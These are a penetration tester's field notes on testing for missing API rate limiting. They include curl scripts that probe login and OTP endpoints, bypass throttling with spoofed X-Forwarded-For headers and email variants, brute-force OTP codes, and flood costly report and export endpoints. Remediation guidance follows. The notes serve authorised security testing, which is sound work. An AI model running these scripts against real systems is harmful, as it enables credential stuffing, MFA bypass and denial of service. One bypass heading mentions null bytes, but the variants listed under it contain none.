# API Rate Limiting — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API4:2023 Unrestricted Resource Consumption
>
> **Severity:** Medium to High — credential stuffing, account enumeration, DoS, business logic abuse
>
> **Real-world impact:** Missing rate limiting is the finding I document most frequently alongside BOLA in enterprise API engagements. It is not technically complex to exploit — send many requests, observe no throttling — but the business impact ranges from credential stuffing attacks against authentication endpoints to resource exhaustion on compute-intensive operations. The most impactful rate limiting absence I find is consistently on authentication endpoints that received no protection, combined with pre-engagement OSINT showing hundreds of leaked company credentials ready to test.

---

## 🧠 Rate Limiting in API Architecture

```
Where rate limiting must be enforced:

Tier 1 — CRITICAL (no exceptions):
  POST /auth/login            → brute force / credential stuffing
  POST /auth/verify-otp       → OTP brute force (4-6 digits)
  POST /auth/forgot-password  → account enumeration + abuse
  POST /auth/reset-password   → token abuse
  POST /auth/refresh          → token flooding
  POST /auth/register         → account creation abuse, spam

Tier 2 — HIGH:
  GET  /users/{id}            → enumeration via BOLA
  POST /api/search            → server load, data harvesting
  POST /api/export            → bulk data extraction
  POST /api/reports/generate  → compute-intensive operations
  POST /api/bulk/*            → batch operation abuse

Tier 3 — MEDIUM:
  All authenticated API endpoints → general API abuse
  Webhook delivery endpoints    → callback flooding
  File upload endpoints         → storage exhaustion

Common enterprise gap:
  Main web endpoint: rate limited ✓
  Mobile API endpoint: rate limiting missing ✗
  Legacy v1 endpoint: rate limiting missing ✗
  Password reset: rate limiting missing ✗
  OTP verification: rate limiting missing ✗
```

---

## 💥 Phase 1 — Testing Rate Limiting Absence

### Authentication Endpoint Testing

```bash
BASE="https://api.company.com"

# Standard rate limiting test — 30 attempts, track first throttle:
test_rate_limit() {
  local endpoint=$1
  local method=${2:-POST}
  local body=${3:-'{"email":"admin@company.com","password":"WrongPass"}'}
  local ctype=${4:-"application/json"}

  echo "=== Testing: $method $endpoint ==="
  for i in $(seq 1 30); do
    code=$(curl -so /dev/null -w "%{http_code}" \
      -X "$method" "$BASE$endpoint" \
      -H "Content-Type: $ctype" \
      -H "Authorization: Bearer TOKEN" \
      -d "$body" 2>/dev/null)
    printf "Attempt %-3d: HTTP %s" "$i" "$code"
    if [[ "$code" == "429" ]]; then
      echo " ← RATE LIMITED"
      # Check Retry-After header:
      retry=$(curl -sI -X "$method" "$BASE$endpoint" \
        -H "Content-Type: $ctype" -d "$body" 2>/dev/null | \
        grep -i "retry-after" | awk '{print $2}')
      [[ -n "$retry" ]] && echo "   Retry-After: ${retry}s"
      return
    fi
    echo ""
  done
  echo "⚠️  NO RATE LIMITING after 30 attempts"
}

# Test all authentication endpoints:
test_rate_limit "/api/v1/auth/login"
test_rate_limit "/api/v1/auth/verify-otp" "POST" \
  '{"email":"admin@company.com","otp":"123456"}'
test_rate_limit "/api/v1/auth/forgot-password" "POST" \
  '{"email":"admin@company.com"}'
test_rate_limit "/api/mobile/v1/auth/login"
test_rate_limit "/api/v1/auth/refresh" "POST" \
  '{"refresh_token":"invalid_token"}'
```

### Rate Limiting Bypass Techniques

```bash
# When rate limiting IS present — test bypass vectors:

# Bypass 1: X-Forwarded-For IP rotation
echo "=== Testing IP rotation bypass ==="
for i in $(seq 1 15); do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST "$BASE/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 192.168.1.$i" \
    -H "True-Client-IP: 172.16.0.$i" \
    -d '{"email":"admin@company.com","password":"WrongPass"}' 2>/dev/null)
  echo "IP 10.0.0.$i: HTTP $code"
  [[ "$code" == "429" ]] && { echo "IP rotation not bypassed"; break; }
done

# Bypass 2: Null byte in email (treated as different identifier)
for variant in \
  "admin@company.com" \
  "Admin@company.com" \
  "ADMIN@company.com" \
  "admin+1@company.com" \
  "admin%40company.com"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST "$BASE/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$variant\",\"password\":\"WrongPass\"}" 2>/dev/null)
  echo "$variant: HTTP $code"
done

# Bypass 3: Race condition on rate limit counter
# Send simultaneous requests before counter increments:
for i in $(seq 1 10); do
  curl -so /dev/null -w "" \
    -X POST "$BASE/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@company.com","password":"WrongPass"}' \
    2>/dev/null &
done
wait
# If some succeed past rate limit threshold = race condition bypass
```

### OTP Brute Force — High Business Impact

```bash
echo "=== OTP Brute Force Feasibility Test ==="
# 6-digit OTP = 1,000,000 combinations
# 4-digit OTP = 10,000 combinations

# Test OTP endpoint rate limiting:
for otp in 000001 000002 000003 000004 000005 \
           000006 000007 000008 000009 000010; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST "$BASE/api/v1/auth/verify-otp" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"otp\":\"$otp\"}" 2>/dev/null)
  echo "OTP $otp: HTTP $code"
  [[ "$code" == "429" ]] && { echo "Rate limited at OTP $otp"; break; }
  [[ "$code" == "200" ]] && { echo "OTP VALID: $otp ← found!"; break; }
done

# If no 429 after 10 attempts:
# Finding: OTP brute force possible
# Impact calculation for report:
# 6-digit OTP + no rate limit + 10 req/sec = ~27.8 hours to exhaust
# 4-digit OTP + no rate limit + 10 req/sec = ~16.7 minutes to exhaust
```

### Resource-Intensive Endpoint Testing

```bash
# Test for missing rate limiting on expensive operations:

# PDF report generation (CPU intensive):
time curl -s -X POST "$BASE/api/v1/reports/generate" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"report_type":"full_export","date_range":"all"}' > /dev/null

# If single request takes 5+ seconds:
# → 10 concurrent requests = potential DoS
# → Test: send 10 concurrent and measure combined response time

# Bulk export (data harvesting):
for i in $(seq 1 5); do
  curl -so /dev/null -w "Bulk export attempt $i: %{http_code}\n" \
    -X POST "$BASE/api/v1/export/all-users" \
    -H "Authorization: Bearer TOKEN" &
done
wait
# If all 5 succeed = no rate limiting on bulk export
```

---

## 📊 Rate Limiting Test Matrix

```
Build this matrix for every enterprise API engagement:

Endpoint                        | Limit? | Bypass? | Finding
────────────────────────────────────────────────────────────────────
POST /api/v1/auth/login         | ✓ (5)  | IP hdr  | MEDIUM — bypass exists
POST /api/v1/auth/verify-otp    | ✗      | N/A     | HIGH — OTP brute forceable
POST /api/v1/auth/forgot-pwd    | ✗      | N/A     | MEDIUM — account enum
POST /api/mobile/v1/auth/login  | ✗      | N/A     | HIGH — separate endpoint
POST /api/v1/reports/generate   | ✗      | N/A     | MEDIUM — resource abuse
POST /api/v1/export             | ✓ (1)  | None    | OK ✓
GET  /api/v1/users/{id}         | ✗      | N/A     | MEDIUM — enumeration
POST /api/v1/auth/register      | ✗      | N/A     | LOW — spam accounts
```

---

## 🗂️ Systematic Testing Checklist

```
AUTH ENDPOINTS (most critical)
☐ POST /auth/login — 30 attempts, watch for 429
☐ POST /auth/verify-otp — 10 sequential OTPs, watch for 429
☐ POST /auth/forgot-password — 20 attempts
☐ POST /auth/refresh — 20 attempts
☐ POST /auth/register — 20 attempts (spam account creation)

BYPASS TECHNIQUES (when limits exist)
☐ X-Forwarded-For header rotation
☐ X-Real-IP header rotation
☐ Email case variation (Admin@ vs admin@)
☐ Email alias variation (+tag suffixes)
☐ Different User-Agent strings per request

SEPARATE ENDPOINT TYPES
☐ Mobile API endpoint tested separately
☐ Legacy/old API version tested separately
☐ Internal API endpoint tested if accessible
☐ Partner/integration API endpoint tested

RESOURCE-INTENSIVE OPERATIONS
☐ Report generation — time single request, test concurrent
☐ Bulk export — test 5 concurrent
☐ File processing — test multiple parallel uploads
☐ Search with large result sets
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Missing Rate Limiting on OTP Verification Endpoint — MFA Bypass Feasible

**Severity:** High | **CVSS v3.1:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Affected Endpoint:** `POST /api/v1/auth/verify-otp`

```
Evidence:
  10 sequential incorrect OTP attempts — no throttling observed:

  Attempt 1-10: HTTP 401 {"error":"Invalid OTP"}
  No HTTP 429 returned at any point

  Attack feasibility:
  OTP digits: 6 (1,000,000 combinations)
  Rate measured: ~8 requests/second (no throttling)
  Time to exhaust 6-digit OTP space: ~34.7 hours (single-threaded)
  Time with 10 parallel threads: ~3.5 hours
  4-digit OTP equivalent: ~20.8 minutes single-threaded

Impact:
  An attacker with valid credentials (available from breach databases
  — see Pre-Engagement TI section) can bypass MFA by automating OTP
  enumeration. MFA as a security control is rendered ineffective.

Remediation:
  Max 5 OTP attempts before temporary lockout (15 minutes)
  Implement per-session rate limiting — not per-IP (easily bypassed)
  Invalidate OTP after first use (prevent replay)
  Set OTP expiry: max 5 minutes validity window
  Alert on multiple failed OTP attempts for same session

  ASP.NET Core rate limiting:
  [EnableRateLimiting("otp-strict")]
  [HttpPost("verify-otp")]
  public async Task<IActionResult> VerifyOtp(...)
  // Configure: PermitLimit = 5, Window = 15 minutes
```

---

## 🧭 Key Takeaways

**1. Test OTP/MFA endpoints first — they are consistently unprotected.**
Login endpoints often have rate limiting because developers know about brute force. OTP verification endpoints are added later, by a different developer, who focuses on the happy path (correct OTP) without thinking about the wrong-OTP path at scale. Always test them separately.

**2. Mobile API endpoints have separate rate limiting (often none).**
The web API at `/api/v2/auth/login` may have strict rate limiting. The mobile API at `/api/mobile/v1/auth/login` — added six months later by a different team — often has none. Certificate transparency, APK analysis, and Burp traffic from a mobile device consistently reveal separate endpoints.

**3. Rate limit bypass via X-Forwarded-For is the most common bypass.**
Many enterprise rate limiting implementations use IP address as the key. If the application trusts `X-Forwarded-For` headers — which many do behind load balancers — an attacker can rotate the apparent source IP on every request, bypassing IP-based rate limits entirely.

**4. Report the attack calculation, not just the absence.**
"No rate limiting on OTP endpoint" is a Medium finding in most risk frameworks. "No rate limiting means a 6-digit OTP can be brute forced in 34.7 hours with a single thread, or under 4 hours with 10 parallel threads" is a High finding that creates urgency for immediate remediation.

---

## 🔗 References
- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [OWASP Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
- [ASP.NET Core Rate Limiting](https://learn.microsoft.com/en-us/aspnet/core/performance/rate-limit)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
